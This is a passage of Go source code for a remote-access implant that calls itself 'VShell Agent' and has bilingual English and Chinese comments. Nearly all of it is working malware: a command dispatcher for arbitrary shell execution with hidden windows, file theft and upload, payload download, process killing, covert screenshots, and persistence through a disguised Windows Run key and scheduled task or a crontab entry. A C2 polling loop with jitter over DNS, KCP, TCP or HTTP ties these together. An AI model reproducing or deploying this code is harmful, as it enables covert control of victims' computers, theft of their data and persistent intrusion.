		path, _ := payload["path"].(string)
		return "", runDelete(path)

	case CmdFileMove:
		src, _ := payload["src"].(string)
		dst, _ := payload["dst"].(string)
		if err := os.Rename(src, dst); err != nil {
			return "", err.Error()
		}
		return fmt.Sprintf("moved: %s -> %s", src, dst), ""

	case CmdFileMkdir:
		path, _ := payload["path"].(string)
		os.MkdirAll(path, 0755)
		return fmt.Sprintf("created: %s", path), ""

	case CmdFileCat:
		path, _ := payload["path"].(string)
		data, err := os.ReadFile(path)
		if err != nil {
			return "", err.Error()
		}
		return string(data), ""

	case CmdFileTouch:
		path, _ := payload["path"].(string)
		f, _ := os.Create(path)
		f.Close()
		return fmt.Sprintf("touched: %s", path), ""

	case CmdDiskInfo:
		return runCommand(getDiskCmd(), 10)

	case CmdPS:
		return runCommand(getPSCmd(), 10)

	case CmdKill:
		pid, _ := payload["pid"].(float64)
		if pid > 0 {
			proc, _ := os.FindProcess(int(pid))
			if proc != nil {
				proc.Kill()
			}
		}
		return fmt.Sprintf("killed: %d", int(pid)), ""

	case CmdUpload:
		path, _ := payload["path"].(string)
		encoded, _ := payload["data"].(string)
		data, err := base64.StdEncoding.DecodeString(encoded)
		if err != nil {
			return "", err.Error()
		}
		if err := os.WriteFile(path, data, 0644); err != nil {
			return "", err.Error()
		}
		return fmt.Sprintf("uploaded: %s (%d bytes)", path, len(data)), ""

	case CmdDownload:
		path, _ := payload["path"].(string)
		data, err := os.ReadFile(path)
		if err != nil {
			return "", err.Error()
		}
		return base64.StdEncoding.EncodeToString(data), ""

	case CmdWget:
		url, _ := payload["url"].(string)
		dst, _ := payload["dst"].(string)
		if url == "" {
			return "", "url required"
		}
		if dst == "" {
			dst = filepathBase(url)
		}
		resp, err := http.Get(url)
		if err != nil {
			return "", err.Error()
		}
		defer resp.Body.Close()
		data, _ := io.ReadAll(resp.Body)
		os.WriteFile(dst, data, 0755)
		return fmt.Sprintf("downloaded: %s -> %s (%d bytes)", url, dst, len(data)), ""

	case CmdSleep:
		interval, _ := payload["interval"].(float64)
		if interval > 0 {
			sleepTime = int(interval)
		}
		return fmt.Sprintf("interval: %d", sleepTime), ""

	case CmdScreenshot:
		return captureScreenshot()

	case CmdExit:
		transport.Close()
		os.Exit(0)
		return "", ""

	default:
		return runCommand(cmdStr, timeout)
	}
}

func runCommand(command string, timeout int) (string, string) {
	var shell, flag string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
		flag = "/C"
	} else {
		shell = "/bin/sh"
		flag = "-c"
	}

	cmd := exec.Command(shell, flag, command)
	hideCmdWindow(cmd)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Start(); err != nil {
		return "", err.Error()
	}

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	if timeout > 0 {
		select {
		case <-time.After(time.Duration(timeout) * time.Second):
			cmd.Process.Kill()
			return stdout.String(), "timeout"
		case err := <-done:
			if err != nil {
				return stdout.String() + "\n" + stderr.String(), err.Error()
			}
			return stdout.String() + "\n" + stderr.String(), ""
		}
	}

	err := <-done
	if err != nil {
		return stdout.String() + "\n" + stderr.String(), err.Error()
	}
	return stdout.String() + "\n" + stderr.String(), ""
}

func listDir(path string) (string, string) {
	entries, err := os.ReadDir(path)
	if err != nil {
		return "", err.Error()
	}
	type FileEntry struct {
		Name    string `json:"name"`
		Size    int64  `json:"size"`
		IsDir   bool   `json:"is_dir"`
		ModTime string `json:"mod_time"`
	}
	var files []FileEntry
	for _, e := range entries {
		info, _ := e.Info()
		var size int64
		var modTime string
		if info != nil {
			size = info.Size()
			modTime = info.ModTime().Format(time.RFC3339)
		}
		files = append(files, FileEntry{e.Name(), size, e.IsDir(), modTime})
	}
	if files == nil {
		files = []FileEntry{}
	}
	sort.Slice(files, func(i, j int) bool {
		if files[i].IsDir != files[j].IsDir {
			return files[i].IsDir
		}
		return files[i].Name < files[j].Name
	})
	data, _ := json.Marshal(files)
	return string(data), ""
}

func runDelete(path string) string {
	info, err := os.Stat(path)
	if err != nil {
		return err.Error()
	}
	if info.IsDir() {
		if err := os.RemoveAll(path); err != nil {
			return err.Error()
		}
		return ""
	}
	if err := os.Remove(path); err != nil {
		return err.Error()
	}
	return ""
}

func getDiskCmd() string {
	if runtime.GOOS == "windows" {
		return "wmic logicaldisk get DeviceID,Size,FreeSpace,FileSystem /format:csv 2>nul"
	}
	return "df -h 2>/dev/null"
}

func getPSCmd() string {
	if runtime.GOOS == "windows" {
		return "tasklist /FO CSV 2>nul"
	}
	return "ps aux 2>/dev/null"
}

// ============================================================================
// Persistence
// 持久化（开机自启动）
// ============================================================================

func installPersistence() (string, string) {
	exe, _ := os.Executable()

	if runtime.GOOS == "windows" {
		// Copy to AppData
		os.MkdirAll(filepathDir(persistPath), 0755)
		src, _ := os.ReadFile(exe)
		os.WriteFile(persistPath, src, 0755)

		// Registry run key
		cmd := exec.Command("reg", "add",
			"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", "WindowsService", "/t", "REG_SZ",
			"/d", persistPath, "/f")
		cmd.Run()

		// Scheduled task
		exec.Command("schtasks", "/create", "/tn", "WindowsUpdate",
			"/tr", persistPath, "/sc", "daily", "/f").Run()

		return fmt.Sprintf("Persistence installed: %s", persistPath), ""
	}

	// Linux/macOS persistence
	os.MkdirAll(filepathDir(persistPath), 0755)
	src, _ := os.ReadFile(exe)
	os.WriteFile(persistPath, src, 0755)
	os.Chmod(persistPath, 0755)

	// Crontab
	cronEntry := fmt.Sprintf("@reboot %s >/dev/null 2>&1\n", persistPath)
	os.WriteFile("/tmp/cron_tmp", []byte(cronEntry), 0644)
	exec.Command("crontab", "/tmp/cron_tmp").Run()
	os.Remove("/tmp/cron_tmp")

	return fmt.Sprintf("Persistence installed: %s", persistPath), ""
}

func removePersistence() (string, string) {
	if runtime.GOOS == "windows" {
		exec.Command("reg", "delete",
			"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", "WindowsService", "/f").Run()
		exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").Run()
	} else {
		exec.Command("crontab", "-r").Run()
	}
	os.Remove(persistPath)
	return "Persistence removed", ""
}

// ============================================================================
// Screenshot capture (platform-specific)
// 截图捕获（平台相关）
// ============================================================================

func captureScreenshot() (string, string) {
	if runtime.GOOS == "windows" {
		return windowsScreenshot()
	}
	return linuxScreenshot()
}

func windowsScreenshot() (string, string) {
	// Use PowerShell to capture screenshot
	psScript := `
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
$ms = New-Object System.IO.MemoryStream
$bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
[Convert]::ToBase64String($ms.ToArray())
$graphics.Dispose()
$bitmap.Dispose()
$ms.Dispose()
`
	cmd := exec.Command("powershell", "-NoProfile", "-Command", psScript)
	hideCmdWindow(cmd)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err.Error()
	}
	// Strip whitespace from base64
	result := strings.TrimSpace(string(output))
	return result, ""
}

func linuxScreenshot() (string, string) {
	// Try various screenshot tools
	for _, tool := range []string{"import", "scrot", "gnome-screenshot", "spectacle"} {
		tmpFile := fmt.Sprintf("/tmp/.ss_%d.png", pid)
		cmd := exec.Command(tool, tmpFile)
		if tool == "import" {
			cmd = exec.Command("import", "-window", "root", tmpFile)
		}
		if tool == "spectacle" {
			cmd = exec.Command("spectacle", "-b", "-n", "-o", tmpFile)
		}
		cmd.Run()
		if data, err := os.ReadFile(tmpFile); err == nil {
			os.Remove(tmpFile)
			return base64.StdEncoding.EncodeToString(data), ""
		}
	}
	return "", "no screenshot tool available (install imagemagick, scrot, or spectacle)"
}

// ============================================================================
// Main loop
// 主循环
// ============================================================================

// main 是 Agent 的入口：加载配置、启动传输、进入签到/任务循环。
// main is the agent entry point: loads config, starts transport, and runs the
// check-in/task loop.
func main() {
	log.Printf("VShell Agent v%s starting (%s/%s)", agentVersion, runtime.GOOS, runtime.GOARCH)
	log.Printf("Host: %s, User: %s, PID: %d", hostname, username, pid)

	// Parse transport mode from server address
	mode := "http"
	addr := ServerAddr
	if strings.Contains(addr, "://") {
		parts := strings.SplitN(addr, "://", 2)
		mode = parts[0]
		addr = parts[1]
	}

	switch mode {
	case "dns":
		transport = newDNSTransport(addr)
	case "kcp":
		transport = newKCPTransport(addr)
	case "tcp", "raw":
		// Pooled TCP transport aligned to FUN_00fc7560/FUN_00fc9de0
		// (message_wire.go frame encryption + <u32 LE len> header).
		transport = newRealTransport(addr, VerifyKey, EncryptSalt)
	case "wss", "https":
		if !strings.HasPrefix(addr, "https") {
			addr = "https://" + addr
		}
		transport = newHTTPTransport(addr)
	default:
		if !strings.HasPrefix(addr, "http") {
			addr = "http://" + addr
		}
		transport = newHTTPTransport(addr)
	}

	// Check-in with exponential backoff
	var backoff time.Duration
	for {
		resp, err := transport.Checkin()
		if err != nil {
			if backoff == 0 {
				backoff = 1 * time.Second
			} else {
				backoff *= 2
			}
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}
			log.Printf("Checkin failed: %v (retry in %v)", err, backoff)
			time.Sleep(backoff)
			continue
		}

		if resp.Status == "ok" {
			log.Printf("Checkin OK: client=%d, session=%s, interval=%d",
				resp.ClientID, resp.SessionID, resp.Interval)
			backoff = 0
			break
		}
		if resp.Message != "" {
			log.Printf("Server message: %s", resp.Message)
		}
		time.Sleep(5 * time.Second)
	}

	// Main C2 polling loop
	for {
		jitter := time.Duration(0)
		if jitterTime > 0 {
			b := make([]byte, 2)
			rand.Read(b)
			jitter = time.Duration(binary.LittleEndian.Uint16(b)%uint16(jitterTime)) * time.Second
		}
		time.Sleep(time.Duration(sleepTime)*time.Second + jitter)

		tasks, err := transport.GetTasks()
		if err != nil {
			continue
		}
		if len(tasks) == 0 {
			continue
		}

		for _, task := range tasks {
			log.Printf("Task %d: %s", task.ID, task.Command)
			result, errMsg := executeCommand(task.ID, task.Command, task.Timeout)
			status := "completed"
			if errMsg != "" {
				status = "failed"
				if result != "" {
					result += "\n"
				}
				result += "ERROR: " + errMsg
			}
			if err := transport.SendResult(task.ID, result, status); err != nil {
				log.Printf("Result send failed: %v", err)
			}
		}
	}
}

// ============================================================================
// Helpers
// 辅助函数
// ============================================================================

func filepathBase(path string) string {
	for i := len(path) - 1; i >= 0; i-- {
		if path[i] == '/' || path[i] == '\\' {
			return path[i+1:]
		}
	}
	return path
}

func filepathDir(path string) string {
	for i := len(path) - 1; i >= 0; i-- {
		if path[i] == '/' || path[i] == '\\' {
			return path[:i]
		}
	}
	return "."
}



